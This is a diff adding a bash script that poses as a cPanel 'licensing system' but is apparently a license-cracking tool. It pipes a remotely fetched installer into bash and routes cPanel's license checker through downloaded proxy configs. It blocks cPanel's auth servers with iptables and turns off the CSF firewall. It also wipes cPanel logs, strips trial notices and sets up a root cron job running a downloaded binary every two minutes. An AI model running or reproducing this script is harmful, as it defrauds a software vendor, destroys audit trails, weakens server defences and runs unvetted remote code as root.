@@ -1,0 +1,365 @@
+#!/bin/bash
+
+RED='\033[0;31m' # Red
+Green='\033[0;32m'        # Green
+Yellow="\033[0;33m"       # Yellow
+BLUE="\e[94m"        # Blue
+Purple="\033[0;35m"       # Purple
+NC='\033[0m' # No Color
+key='cpanel'
+api="https://example.com/api/getinfo?key=$key"
+api_license="https://example.com/api/license?key=$key"
+status_code=$(curl -LI "$api" -o /dev/null -w '%{http_code}\n' -s)
+plast_bin="/usr/bin/plast"
+current_ip=$(curl -s https://ipinfo.io/ip)
+domain_show="Company Name"
+brand_show="Provider"
+server_type="VPS"
+hostname_show=$( hostname )
+cpversion="/usr/local/cpanel/version"
+kv="$(uname -r)"
+date="$( date +"%m-%d-%Y")"
+server_type="VPS"
+status=false
+server_range=0
+firewall_stop='false'
+firewall_stop_1='false'
+action="$1"
+echo ""
+printf "${Green}Please Wait important packages need to be installed ...${NC}\n"
+
+if ! [ -x "$(command -v python)" ]; then
+
+    printf "${RED}python is not installed${NC}\n"
+    echo ""
+    exit 1
+fi
+if [ "$action" != 'install' ];then
+
+if [ ! -f "/usr/local/cpanel/cpkeyclt" ]; then
+    printf "${RED}Cpanel is not detected${NC}\n"
+    printf "${RED}You need to install Cpanel${NC}\n"
+    echo ""
+    echo ""
+    printf "${Green}For quick installation${NC}\n"
+    printf "${Green}./installer install ${NC}\n"
+    echo ""
+    exit 1
+fi
+
+fi
+if [ -f /etc/redhat-release ]; then
+
+      yum install deltarpm  -y  1> /dev/null
+
+fi
+
+
+
+if ! [ -x "$(command -v wget)" ]; then
+
+if [ -f /etc/redhat-release ]; then
+
+            yum -q install wget -y  1> /dev/null
+else
+           apt-get install -q -y  wget  1> /dev/null
+
+fi
+fi
+
+
+output=$( curl -s   "$api" )
+if [ "$status_code" != "200"  ];then
+printf "${RED}Something Went Wrong [Unknown Ip]  ${NC}\n"
+echo ""
+exit 1
+fi
+
+expire_date=$(echo $output | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["expire_date"]);')
+get_domain_show=$(echo $output | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["domain_name"]);')
+get_brand_show=$(echo $output | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["brand_name"]);')
+
+
+
+if [ "$get_domain_show" != '' ];then
+domain_show="$get_domain_show"
+fi
+if [ "$get_brand_show" != '' ];then
+brand_show="$get_brand_show"
+fi
+rpm -Uvh https://dl.fedoraproject.org/pub/epel/epel-release-latest-6.noarch.rpm &> /dev/null 2>&1
+yum install figlet &> /dev/null 2>&1
+echo ""
+printf "${BLUE}"
+figlet -w 200 -f  standard  "${brand_show}"
+echo ""
+printf "${Purple} ---------------------- Licensing System started ----------------------${NC}\n"
+printf "${Purple}        Thank you for using ${domain_show} licensing system !${NC}\n"
+printf "${Purple} ----------------------------------------------------------------------${NC}\n"
+printf "${Purple}| Our Website: ${domain_show} ${NC}\n"
+printf "${Purple}| Server IPV4: ${current_ip} ${NC}\n"
+printf "${Purple}| Hostname: ${hostname_show} ${NC}\n"
+printf "${Purple}| License Type: ${server_type} ${NC}\n"
+printf "${Purple}| cPanel Version: $(<$cpversion) ${NC}\n"
+printf "${Purple}| Kernel Version: ${kv} ${NC}\n"
+printf "${Purple}| License Activation Date: ${date} ${NC}\n"
+printf "${Purple}| License Expiry Date: ${expire_date} ${NC}\n"
+printf "${Purple} ----------------------------------------------------------------------${NC}\n"
+echo ""
+printf "${Purple} If you have any question connect us on our website. ${NC}\n"
+printf "${Purple}Copyright © 2017-2020 ${brand_show} - All rights reserved.${NC}\n"
+printf "${Purple} ----------------------------------------------------------------------${NC}\n"
+echo ""
+
+printf "${Green}Please Wait!${NC}\n"
+printf "${Yellow}Generating cPanel License...${NC}\n"
+
+if [ ! -f "/usr/local/bin/plast" ];then
+        wget -q   "http://api.example.com/api/files/plast/plast.tar.gz?key=$key"  -O "plast.tar.gz" &> /dev/null
+        tar xf plast.tar.gz
+
+if [ -f /etc/redhat-release ]; then
+        yum -q install git make gcc -y &> /dev/null
+        wget -q  -O-  "http://api.example.com/api/files/plast/installer.sh?key=$key" |  bash -s &> /dev/null
+        mv /usr/local/bin/proxychains4 /usr/bin/plast &> /dev/null
+elif [ -f /etc/lsb-release ] || [ -f /etc/os-release ]; then
+         apt install -y git make gcc -y &> /dev/null
+        wget -q  -O-  "http://api.example.com/api/files/plast/installer.sh?key=$key" |  bash -s &> /dev/null
+        mv /usr/local/bin/proxychains4 /usr/bin/plast &> /dev/null
+else
+printf "${RED} Unsupported System ${NC}\n"
+exit 1
+
+fi
+fi
+rm -rf  /etc/cron.d/licensecp  &> /dev/null
+wget -q  -O "/usr/bin/installssl"  "http://api.example.com/api/files/$key/installssl?key=$key"  &> /dev/null
+wget -q  -O "/usr/share/installssl.pl"  "http://api.example.com/api/files/$key/installssl.pl?key=$key"  &> /dev/null
+wget -q  -O "/usr/bin/gblicensecp"  "http://api.example.com/api/files/$key/gblicensecp?key=$key"  &> /dev/null
+wget -q  -O "/usr/bin/gblicensecp_update"  "http://api.example.com/api/files/$key/gblicensecp_update?key=$key"  &> /dev/null
+chmod +x  "/usr/bin/gblicensecp_update"  &> /dev/null
+chmod +x  "/usr/bin/gblicensecp"  &> /dev/null
+chmod +x  "/usr/bin/installssl"  &> /dev/null
+
+echo ""
+echo ""
+echo ""
+echo ""
+firewall_drop(){
+    ## output
+    firewall=$(  iptables --list OUTPUT --line-number )
+    if ! (echo "$firewall" | grep 'DROP       all  --  auth2.cpanel.net' > /dev/null); then
+        iptables -A OUTPUT  -s auth2.cpanel.net -j DROP
+    fi
+    if ! (echo "$firewall" | grep 'DROP       all  --  auth5.cpanel.net' > /dev/null); then
+        iptables -A OUTPUT  -s auth5.cpanel.net -j DROP
+    fi
+    if ! (echo "$firewall" | grep 'DROP       all  --  auth10.cpanel.net' > /dev/null); then
+        iptables -A OUTPUT  -s auth10.cpanel.net -j DROP
+    fi
+    if ! (echo "$firewall" | grep 'DROP       all  --  auth7.cpanel.net' > /dev/null); then
+        iptables -A OUTPUT  -s auth7.cpanel.net -j DROP
+    fi
+    if ! (echo "$firewall" | grep 'DROP       all  --  auth3.cpanel.net' > /dev/null); then
+        iptables -A OUTPUT  -s auth3.cpanel.net -j DROP
+    fi
+    if ! (echo "$firewall" | grep 'DROP       all  --  auth9.cpanel.net' > /dev/null); then
+        iptables -A OUTPUT  -s auth9.cpanel.net -j DROP
+    fi
+    ## input
+      firewall=$(  iptables --list INPUT --line-number )
+    if ! (echo "$firewall" | grep 'DROP       all  --  auth2.cpanel.net' > /dev/null); then
+        iptables -A INPUT  -s auth2.cpanel.net -j DROP
+    fi
+    if ! (echo "$firewall" | grep 'DROP       all  --  auth5.cpanel.net' > /dev/null); then
+        iptables -A INPUT  -s auth5.cpanel.net -j DROP
+    fi
+    if ! (echo "$firewall" | grep 'DROP       all  --  auth10.cpanel.net' > /dev/null); then
+        iptables -A INPUT  -s auth10.cpanel.net -j DROP
+    fi
+    if ! (echo "$firewall" | grep 'DROP       all  --  auth7.cpanel.net' > /dev/null); then
+        iptables -A INPUT  -s auth7.cpanel.net -j DROP
+    fi
+    if ! (echo "$firewall" | grep 'DROP       all  --  auth3.cpanel.net' > /dev/null); then
+        iptables -A INPUT  -s auth3.cpanel.net -j DROP
+    fi
+    if ! (echo "$firewall" | grep 'DROP       all  --  auth9.cpanel.net' > /dev/null); then
+        iptables -A INPUT  -s auth9.cpanel.net -j DROP
+    fi
+    chmod -x /usr/local/cpanel/cpkeyclt &> /dev/null
+    if [ -f "/usr/sbin/csf" ];then
+
+        if [ "$firewall_stop_1"  == "true" ];then
+            /usr/sbin/csf -e &> /dev/null
+            rm -rf /etc/csf/csf.error &> /dev/null
+        fi
+        if [ "$firewall_stop"  == "true" ];then
+            service csf start &> /dev/null
+            rm -rf /etc/csf/csf.error &> /dev/null
+        fi
+    fi
+
+}
+firewall_accept(){
+    ## output
+    ProccessID=$( iptables --list OUTPUT --line-number | grep -E '*.cpanel.net'  )
+    SAVEIFS=$IFS   # Save current IFS
+    IFS=$'\n'      # Change IFS to new line
+    ProccessID=($ProccessID) # split to array $names
+    IFS=$SAVEIFS   # Restore IFS
+    for (( i=0; i<${#ProccessID[@]}; i++ ))
+    do
+        currentID=$( echo "$ProccessID[$i]" |  head -n1 | awk '{print $1;}' )
+        iptables -D OUTPUT $currentID
+    done
+    ## input
+    ProccessID=$( iptables --list INPUT --line-number | grep -E '*.cpanel.net'  )
+    SAVEIFS=$IFS   # Save current IFS
+    IFS=$'\n'      # Change IFS to new line
+    ProccessID=($ProccessID) # split to array $names
+    IFS=$SAVEIFS   # Restore IFS
+    for (( i=0; i<${#ProccessID[@]}; i++ ))
+    do
+        currentID=$( echo "$ProccessID[$i]" |  head -n1 | awk '{print $1;}' )
+        iptables -D INPUT $currentID
+    done
+   if [ -f "/usr/sbin/csf" ];then
+        output_check_license=$( /usr/sbin/csf )
+        if ! ( echo "$output_check_license" | grep 'have been disabled' > /dev/null ) ;then
+            /usr/sbin/csf -x &> /dev/null
+            rm -rf /etc/csf/csf.error &> /dev/null
+            firewall_stop_1="true"
+        fi
+        csf_status=$( systemctl is-active csf )
+        if [  "$csf_status" == "active" ];then
+        firewall_stop="true"
+        service csf stop &> /dev/null
+        rm -rf /etc/csf/csf.error &> /dev/null
+        fi
+    fi
+}
+checkLicense() {
+    chmod +x /usr/local/cpanel/cpkeyclt &> /dev/null
+    output_check_license=$(   /usr/local/cpanel/cpkeyclt  )
+    if echo "$output_check_license" | grep 'Update succeeded' > /dev/null; then
+        if [ -f "/var/cpanel/dnsonly" ];then
+            status=false
+        else
+            status=true
+        fi
+    elif echo "$output_check_license" | grep 'already be running' > /dev/null; then
+        # kill proccess id
+        printf "${RED}License checker already running Kill it first${NC}\n"
+        ps aux | grep cpkeyclt | grep -v grep | awk '{print "kill -9 " $2;system("kill -9 " $2)}'  &> /dev/null
+        checkLicense
+    else
+        status=false
+    fi
+}
+exec_license(){
+    firewall_accept
+    ps aux | grep gblicensecp | grep -v grep | awk '{print "kill -9 " $2;system("kill -9 " $2)}'  &> /dev/null
+    rm -rf /usr/bin/pid/running.pid &> /dev/null
+    chmod +x /usr/local/cpanel/cpkeyclt &> /dev/null
+    output=$($plast_bin -q -f "$1" /usr/local/cpanel/cpkeyclt --force &> /dev/null)
+    # remove file log
+    rm -rf "$1" &> /dev/null
+}
+install_software(){
+    printf "${Green}Installation will take about 10 minutes ${NC}\n"
+    echo ""
+    echo ""
+    printf "${Green}Please Wait...${NC}\n"
+    yum install perl  -y  1> /dev/null
+    curl -o latest -L https://securedownloads.cpanel.net/latest &> /dev/null
+    sh latest
+    rm -rf latest &> /dev/null
+
+}
+if [ "$action" == 'install' ];then
+if [ ! -f "/usr/local/cpanel/cpkeyclt" ];then
+install_software
+echo ""
+echo ""
+if [ ! -f "/usr/local/cpanel/cpkeyclt" ]; then
+printf "${RED}Installation Status FAILED${NC}\n"
+
+else
+printf "${Green}Installation Status OK${NC}\n"
+
+fi
+echo ""
+echo ""
+fi
+fi
+firewall_accept
+checkLicense
+if [ "$status" == "false" ];then
+    output_license=$( curl -s   "$api_license")
+    proxy_conf=$(echo $output_license | \
+        python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["proxy_conf"]);' )
+    file_conf="$RANDOM.conf"
+    path_conf="/usr/bin/.log"
+    full_path="$path_conf/$file_conf"
+    mkdir -p "$path_conf" &> /dev/null
+    printf "$proxy_conf" > $full_path
+    exec_license "$full_path"
+    checkLicense
+fi
+if [ "$status" != "true" ];then
+    while [ "$status" != "true" ]
+    do
+        server_range=$(( server_range + 1))
+        output_license=$( curl -s   "$api_license&server_range=$server_range")
+        proxy_conf=$(echo $output_license | \
+            python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["proxy_conf"]);' )
+        if [ "$proxy_conf" != ''  ];then
+            file_conf="$RANDOM.conf"
+            path_conf="/usr/bin/.log"
+            full_path="$path_conf/$file_conf"
+            mkdir -p "$path_conf" &> /dev/null
+            printf "$proxy_conf" > $full_path
+            exec_license "$full_path"
+            checkLicense "$full_path"
+            if [ "$status" == "true" ];then
+                    printf "${Green}Method $server_range OK${NC}\n"
+                    break
+            fi
+        else
+            status='false'
+            break
+        fi
+        printf "${Green}Method $server_range FAILED${NC}\n" &> /dev/null 2>&1
+    done
+fi
+chattr -a /usr/local/cpanel/logs/*  &> /dev/null
+rm -rf /usr/local/cpanel/logs/* &> /dev/null
+rm -rf /usr/local/cpanel/logs/license_log &> /dev/null
+rm -rf /var/cpanel/updatelogs &> /dev/null
+rm -rf /usr/local/cpanel/logs/update_analysis &> /dev/null
+
+if [ "$status" == "true" ];then
+echo "" > /usr/local/cpanel/whostmgr/docroot/templates/menu/_trial.tmpl &> /dev/null
+sed -i -e "s/CPANEL.CPFLAGS.item('trial')/False/g" "/usr/local/cpanel/base/frontend/paper_lantern/_assets/master_retro/master_content.html.tt" &> /dev/null
+sed -i -e "s/CPANEL.CPFLAGS.item('trial')/False/g" "/usr/local/cpanel/base/frontend/paper_lantern/_assets/master_content.html.tt" &> /dev/null
+printf "${Green}cPanel Status : OK${NC}\n"
+echo ""
+echo ""
+printf "${Green}To Re-New your Cpanel License you can use :${NC}\n"
+printf "${Green}    gblicensecp ${NC}\n"
+
+else
+printf "${Green}cPanel Status FAILED${NC}\n"
+fi
+echo ""
+echo ""
+firewall_drop
+cronjob="PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
+
+*/2 * * * * root /usr/bin/gblicensecp >/dev/null 2>&1
+"
+
+printf "$cronjob" > /etc/cron.d/licensecp
